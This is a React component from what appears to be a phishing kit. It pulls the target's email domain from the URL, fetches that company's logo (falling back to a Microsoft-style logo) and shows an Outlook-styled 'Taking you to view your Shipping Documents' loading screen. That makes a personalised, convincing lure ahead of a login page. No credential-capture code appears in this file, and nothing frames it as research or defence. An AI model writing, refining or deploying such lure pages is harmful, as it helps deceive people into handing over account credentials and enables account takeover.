
import React from "react";
// import { FaArrowLeftLong } from "react-icons/fa6";
import './App.css';
import Loding from './meme.gif'

const Custom = ()=>{

    const redirectURL = window.location.href;
    const sliceEqualSign = redirectURL.indexOf("@");
    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    console.log('csutom',extracetdemailDomain);



    const emailInTheURLEtension = window.location.href;
    const sliceIn = emailInTheURLEtension.indexOf("@");
    const extendToDom = emailInTheURLEtension.substring((sliceIn+1)).toUpperCase().split('.', 1);

    
    return(<>
        <div className="custom_preloader_ Outlook_form_wrapper" id="custom_preloader_">
        <main style={{
                    display:'flex',
                    alignItems:'center'
                }}>
                <img 
                    alt="outlook_svg"
                    src={`https://logo.clearbit.com/https://${extracetdemailDomain}`}
                    className="dommm"
                    // onError={e=> e.target.src = "https://media.geeksforgeeks.org/wp-content/uploads/20220608214420/galaryImage5-300x300.png"}
                    onError={e=> e.target.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMwAAADACAMAAAB/Pny7AAAAn1BMVEWBvAYFpvD/ugjzUyXz8/P29Ph9ugD/tADzRADy8/D59vPy9fn79//z9vfy9/8An/D/+fO+2Jvz5ODz/v/n7d3z3dji6tbK4vL07t+t1fH43K3zq53znYqXxk1CsfD9wEPf7PKAx/HzTBfzdFf60oCz03/25srz7OrzpZrzyb/U47vzLwDzloGu0XVrswDzaE++2JOSzvL514/+vjUAmPC7sX1nAAAB0ElEQVR4nO3cW08TURSA0SLTUqhjuYOicr8WWlT+/2/TpE4wDAk5gS2T3fU9k5yu7H2Gt9OrEtV77x/wlv1PzGpQbczl1UFIV9f1/ID+zUZQq08x9eZkGNLkdmt+wse76SCk6Xa/hRkuhzT82mDOB72QBjAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMAkxk5OQHjF3MY+bPPu6yew0pNlBg7n/FlQLU1U7QW02j+hs7wbVekTnz2yiag7oR1W1MQmC6WowXe0RsxZVc8Aoqmcwe0Ed/dWM9i+Cav+fOfoe1I/1+QGffv46jGm/bmHGSyGNjxvM2cqHkFZyYUYwMO5MESbVZFJhrBkMTBnGnYGBKcO4MzDWrAyTajKpMNasqxiTgbFmZZhUk0mFsWYwMAuM8QGAsWZlmFSTSYWxZjAwC4zxAYCxZmWYVJOB6SrGnYGxZmWYVJOB6SrGnYGBKcO4MzDWrAyTajKpMNasqxiTgbFmZZhUk0mFsWYwMAuM8QGAeZc1exiH9PAPJqj2ZOrPQe01j+hcfAnqsnqKia9++U9eWaqHp34DAe8ojnVr2CQAAAAASUVORK5CYII="}
                />

                    &#160;&#160;&#160;

                <span><b>{extendToDom}</b></span>
                </main>

                <div className="loaddddddin___">
                    <p className="takkk">
                        Taking you to view your
                        Shipping Documents
                    </p>
                </div>


                <div>
                    <img 
                        src={`${Loding}`}
                        alt="Shipping Documents"
                        className="ShippingDocuments"
                    />
                </div>


                <footer>
                    <span className="canccc">
                        cancel
                    </span>
                </footer>
        </div>
    </>)
};

export default Custom;